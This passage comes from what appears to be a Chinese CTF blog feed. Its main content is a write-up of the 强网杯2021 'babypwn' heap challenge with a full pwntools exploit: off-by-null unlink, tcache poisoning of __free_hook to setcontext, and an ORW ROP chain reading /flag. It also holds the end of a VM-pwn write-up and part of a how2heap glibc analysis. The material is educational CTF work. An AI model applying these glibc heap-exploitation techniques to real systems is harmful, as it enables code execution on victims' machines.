:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/52020bea84744e0291879fb412482998.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><p>当shell拿到之后，我们发现这种题目其实并不难，只要计算一下地址然后写入就行了。就是分析代码比较麻烦，需要明确每一种指令分别代表什么含义，找到里面的漏洞进而思考如何getshell。从这道题可以看出，vm-pwn题中最为致命的就是堆栈检查不严格，可能会产生任意地址读写漏洞，还有整型溢出问题也值得关注。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2021 pwn 赛题解析——babypwn</title>
      <link href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/"/>
      <url>/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94babypwn/</url>
      
        <content type="html"><![CDATA[<p>这道题增加了沙箱机制，通过seccomp-tools可以轻松获取沙箱的具体内容。</p><p><img src="https://img-blog.csdnimg.cn/7a4279ec88e74e9cb4d47dca9c3a0456.png"><br>其中的重点就是禁用了execve系统调用，无法直接通过one_gadget、system等直接getshell。这种情况下最为常用的利用方式就是set_context函数，具体如何利用，往下看。</p><p>本题的逆向分析很简单，注意bss中结构体的识别：前8字节是地址，后8字节是大小。在show函数中发现了一个简单的加密函数：</p><p><img src="https://img-blog.csdnimg.cn/d9ef1b3c1668495bb168ed3f51841a9c.png"><br>其每一轮的计算如下图所示，红色部分是因为溢出而无法计算的部分，每一轮的计算结果就相当于是所有黄色部分对应位异或的结果。<br><img src="https://img-blog.csdnimg.cn/f14dc06b21fd48248692237b77a64de6.png"><br>那么这个函数应该如何解密呢？观察到每一轮的计算又可以分为3小轮，最后一轮是某个值与自身左移13位的异或。第二轮是另外一个值与自身右移17位的异或得到第三轮的初始值。第一轮是输入与输入自身左移5位的异或得到第二轮的初始值。如此设计解密算法也就不难了，相信了解一些算法的读者都能编写脚本。解密函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><p>通过show函数，我们能够获取到堆块的地址。不过需要注意的是，show函数加密的并非堆块自身的地址，而是堆块前8字节的值。通过调试我们可以发现，在程序初始化时调用的seccomp系列函数会申请一些堆块，我们通过申请到这些堆块有可能使得堆块的前8字节是一个堆块地址，以此来获取堆区地址。</p><p>本题的libc环境是2.27版本，有机会改写钩子到setcontext函数【<strong>插一句：在笔者的2.31版本libc中，setcontext函数的栈迁移指令从<code>mov rsp, [rdi+0xA0]</code>被改成了<code>mov rsp,[rdx+0xA0]</code>，这使得本题在2.31环境下无法利用，因为在执行到这里的时候无法控制rdx的值</strong>】。自然而然地，我们容易想到使用unlink堆块重叠的利用方式。在chunk中写一个假chunk，在假chunk的prev_size写入这个chunk的地址，然后将fd和bk指针写到合适的位置，就能够触发unlink。和同年的easy_diary相比，利用难度还更低些。</p><p><img src="https://img-blog.csdnimg.cn/bbadd28a80ff448791bfc3028b498852.png"><br>这里需要注意一下edit函数中的一个看似奇怪的函数。这个函数在read之后调用，会将第一个出现的’\x11’字符替换为0x0。乍一看，这个字符并不是字符串的结束符，但转念一想，不难发现这是出题人在为我们创造off by null的条件：’\x11’很有可能是某个chunk的size的最低1字节。可以通过这个特性修改chunk的大小和prev_inuse位。由于chunk的大小被修改了，因此在这个chunk的最后面还需要写上一个有效的size值，最低位为1，以绕过检查。</p><p>在成功unlink之后，就可以利用堆块重叠修改tcache chunk的fd指针到__free_hook。将其改写到setcontext内部即可实现栈迁移。然后构造好ROP链，打开文件、读文件、写数据。在笔者的机器上，通过调试将rdx改为与rdi的值相等实现栈迁移，但不知何故打开flag文件总是失败。</p><p>exp:（基于20.04，且需要调试修改rdx的值）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./babypwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&#x27;../../../../ld/ld-2.27.so&#x27;, &#x27;./babypwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    lodword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    lodword = decrypt(lodword)</span><br><span class="line">    hidword = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(), <span class="number">16</span>)</span><br><span class="line">    hidword = decrypt(hidword)</span><br><span class="line">    <span class="keyword">return</span> lodword + (hidword &lt;&lt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bits</span>(<span class="params">value, start, end</span>):</span><br><span class="line">    <span class="keyword">return</span> (value &gt;&gt; start) &amp; ((<span class="number">1</span> &lt;&lt; (end - start)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>)                            <span class="comment"># chunk 0, used for leaking address</span></span><br><span class="line">chunk0_addr = show(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># chunk #2~8</span></span><br><span class="line">chunk1_addr = chunk0_addr + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk1_addr + <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(chunk1_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(chunk1_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)                           <span class="comment"># chunk #9</span></span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #10</span></span><br><span class="line">add(<span class="number">0x20</span>)                           <span class="comment"># chunk #11, goalkeeper</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x28</span>))               <span class="comment"># this can change the chunk #9&#x27;s size from 0x511 to 0x500</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x20</span>) + p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>))        <span class="comment"># write correct prev_size</span></span><br><span class="line">edit(<span class="number">10</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">8</span> - i)                   <span class="comment"># delete chunk #2~8</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># recover chunk #1, 2</span></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># recover chunk #3</span></span><br><span class="line">main_arena = show(<span class="number">3</span>) - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">openfile = base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readfile = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writefile = base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">poprdi_ret = base + <span class="number">0x23B6A</span></span><br><span class="line">poprsi_ret = base + <span class="number">0x2601F</span></span><br><span class="line">poprdx_ret = base + <span class="number">0x142C92</span></span><br><span class="line">addrsp0x18_ret = base + <span class="number">0x349ea</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #5</span></span><br><span class="line">edit(<span class="number">5</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(__free_hook))</span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #6</span></span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #7, to __free_hook</span></span><br><span class="line">edit(<span class="number">7</span>, p64(setcontext + <span class="number">0x3D</span>))     <span class="comment"># change __free_hook to setcontext + 0x3D, ready for stack pivoting</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #8</span></span><br><span class="line">chunk8_addr = chunk1_addr + <span class="number">0x410</span></span><br><span class="line"></span><br><span class="line">ROP = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment"># 0x0</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x10</span>)          <span class="comment"># 0x30</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x38</span></span><br><span class="line">ROP += p64(<span class="number">2</span>)                           <span class="comment"># 0x40</span></span><br><span class="line">ROP += p64(openfile)                    <span class="comment"># 0x48</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x50</span></span><br><span class="line">ROP += p64(<span class="number">3</span>)                           <span class="comment"># 0x58</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x60</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0x68</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0x70</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0x78</span></span><br><span class="line">ROP += p64(readfile)                    <span class="comment"># 0x80</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x88</span></span><br><span class="line">ROP += p64(<span class="number">1</span>)                           <span class="comment"># 0x90</span></span><br><span class="line">ROP += p64(addrsp0x18_ret)              <span class="comment"># 0x98</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x40</span>)          <span class="comment"># 0xA0</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0xA8</span></span><br><span class="line">ROP += p64(<span class="number">0xdeadbeef</span>)                  <span class="comment"># 0xB0</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0xB8</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0xC0</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0xC8</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0xD0</span></span><br><span class="line">ROP += p64(writefile)                   <span class="comment"># 0xD8</span></span><br><span class="line">edit(<span class="number">8</span>, ROP)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(6)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-6/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-6/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3516">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 18.04<br>Glibc 版本：Ubuntu GLIBC 2.27-3ubuntu1.5</p><p>按照顺序，本文将分析glibc 2.27文件夹下的前6个源码，其中主要分析fastbin_reverse_into_tcache，house_of_botcake，house_of_lore。<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p><h1 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h1><p>熟悉的味道。double free嘛。不过首先将tcache对应的cache填满了。不再赘述。</p><h1 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h1><p>看标题应该和tcache有关，仔细看一下。</p><p>首先就分配了14个0x50大小的chunk，然后释放7个填满了tcache，再释放7个填满了fastbin。在栈区分配了6个8字节空间，初始化为全0xcd。之后漏洞关键步骤：将第8个free掉的chunk（即第1个被放入fastbin的chunk）的fd修改为栈区这6个8字节空间的开头。<font color=red>记住：第8个被释放的chunk在fastbins的尾部，fastbin是<strong>链栈结构</strong>。</font></p><p>之后，将tcache分配完清空。然后注意：再malloc一次会将所有fastbin chunks转到tcache中，而且是和fastbin逆序的关系链入tcache。</p><p>这是malloc之前的bins：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x555555757660 —▸ 0x555555757610 —▸ 0x5555557575c0 —▸ 0x555555757570 —▸ 0x555555757520 ◂— ...</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>这是malloc之后的bins：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x50 [  7]: 0x7fffffffe180 —▸ 0x555555757490 —▸ 0x5555557574e0 —▸ 0x555555757530 —▸ 0x555555757580 —▸ 0x5555557575d0 —▸ 0x555555757620 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>从前后的变化我们可以大胆猜测这一步进行了什么操作：</p><p>由于malloc之前tcache没有chunk，所以_int_malloc只能从fastbin中查找。查找到合适的chunk之后，会将这个chunk记录下来留作之后返回。但是并不是立即返回，_int_malloc发现fastbin后面还有chunk，于是从头指针不断弹出chunk到tcache的头指针。如此操作之后原来fastbin中的chunk到了tcache的顺序就反过来了。因为一个fastbin最多有7个chunk。那么_int_malloc函数应该会循环7次退出，或者是检查到chunk的fd指针为0时退出（这个chunk就是fastbin中最后一个chunk了）。在malloc之后，fastbin中还剩下6个chunk。在弹出这6个chunk之后，libc发现了我们修改的fd指针，此时fastbin的指针指向栈区，于是libc顺理成章地将这个栈区的指针也链入到了tcache中，并放在tcache的头部，然后不加检查地就退出了。此时，fastbin中却只剩下了一地鸡毛：一个我们在初始化栈区时嵌入的无效的指针值（0xcdcdcdcdcdcdcdcd）。在栈区指针链入之后，栈区中的值实际上就已经发生了改变，fd指针的地方变成了后面一个chunk的地址，bk指针的地方应该是被修改为了tcache结构体位置的地址（因为tcache中后面的chunk在bk处设置的值是相等的）。然后，我们只要再进行一次malloc就能够获得一个栈上面的地址了。</p><p>查看源代码之后，验证了我们的猜想。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not 